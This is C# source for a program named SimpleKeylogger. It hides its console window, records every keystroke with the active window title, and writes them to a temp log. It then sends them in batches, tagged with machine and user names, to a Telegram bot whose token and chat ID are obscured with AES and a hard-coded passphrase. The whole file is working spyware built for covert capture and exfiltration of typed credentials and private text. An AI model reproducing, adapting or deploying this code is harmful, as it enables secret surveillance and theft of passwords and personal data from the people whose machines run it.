using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleKeylogger
{
    class Program
    {
        private static readonly HttpClient _http = new();
        private static readonly ConcurrentQueue<string> _batch = new();
        private static readonly object _sendLock = new();
        private static int _lineCount;
        private static string _logPath = null!;

        // ENCRYPTED CREDENTIALS ---
        private const string EncryptedBotToken = "cTrxzJZMRMQBeuKwYfrS2JVki04ZEhk9yorJxDiWh5PKu2hIk70afqf6KoHT1YdG";
        private const string EncryptedChatId = "bLyRAKoA04Mvvi+qDhvu9A==";

        private static readonly string _botToken;
        private static readonly string _chatId;
        private const int BatchSize = 100;

        static Program()
        {
            _botToken = DecryptString(EncryptedBotToken);
            _chatId = DecryptString(EncryptedChatId);
        }

        static async Task Main(string[] args)
        {
            // Hide console window
            HideConsoleWindow();

            _logPath = Path.Combine(Path.GetTempPath(), "ks.log");
            using var logger = new Keylogger();
            using var cts = new CancellationTokenSource();

            logger.KeyCaptured += (_, e) =>
            {
                if (string.IsNullOrEmpty(e.Text))
                    return;

                var line = $"{e.Timestamp:HH:mm:ss} | {e.WindowTitle.Truncate(40)} | {e.Text}";
                File.AppendAllText(_logPath, line + "\n");

                _batch.Enqueue(line);
                int count = Interlocked.Increment(ref _lineCount);

                if (count >= BatchSize)
                    _ = FlushBatchAsync();
            };

            logger.Start();

            // Keep alive until process killed
            await Task.Delay(-1, cts.Token);
        }

        // Hide Console
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        private static void HideConsoleWindow()
        {
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
                ShowWindow(handle, SW_HIDE);
        }

        //Encryption
        private static readonly byte[] _salt = { 0x4A, 0x8F, 0x2E, 0xC1, 0x9D, 0x3B, 0x7F, 0x55, 0xE2, 0xA8, 0x0C, 0xD4, 0x6B, 0x91, 0x3E, 0x7C };
        private static readonly byte[] _iv = { 0x1C, 0x8E, 0x4A, 0x2F, 0x9D, 0x6B, 0x3F, 0x7E, 0xC2, 0xA1, 0x5D, 0x8B, 0xE4, 0x3C, 0x7A, 0x9F };

        private static string DecryptString(string cipherText)
        {
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            byte[] key = Rfc2898DeriveBytes.Pbkdf2(
                Encoding.UTF8.GetBytes(GetPassphrase()), _salt, 100000, HashAlgorithmName.SHA256, 32);

            using var aes = Aes.Create();
            aes.Key = key;
            aes.IV = _iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var decryptor = aes.CreateDecryptor();
            byte[] plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
            return Encoding.UTF8.GetString(plainBytes);
        }

        private static string GetPassphrase() => "My$ecure!Campaign2024#Key";

        // Telegram
        private static async Task FlushBatchAsync()
        {
            if (!Monitor.TryEnter(_sendLock)) return;

            try
            {
                Interlocked.Exchange(ref _lineCount, 0);
                var lines = new List<string>();
                while (_batch.TryDequeue(out var line)) lines.Add(line);
                if (lines.Count == 0) return;

                var plain = new StringBuilder();
                plain.AppendLine($"--- {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ---");
                foreach (var l in lines) plain.AppendLine(l);

                await SendAsDocument(plain.ToString(), lines.Count);
            }
            catch { }
            finally
            {
                Monitor.Exit(_sendLock);
            }
        }

        private static async Task SendAsDocument(string content, int lineCount)
        {
            string machine = Environment.MachineName;
            string user = Environment.UserName;
            string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
            string fileName = $"{machine}_{user}_{timestamp}.txt";

            using var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes(content));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");

            using var formData = new MultipartFormDataContent();
            formData.Add(new StringContent(_chatId), "chat_id");
            formData.Add(new StringContent($"[{machine}\\{user}] {lineCount} keystrokes"), "caption");
            formData.Add(fileContent, "document", fileName);

            await _http.PostAsync($"https://api.telegram.org/bot{_botToken}/sendDocument", formData);
        }
    }

    internal static class StringExtensions
    {
        public static string Truncate(this string value, int maxLength) =>
            value.Length <= maxLength ? value : value[..(maxLength - 3)] + "...";
    }
}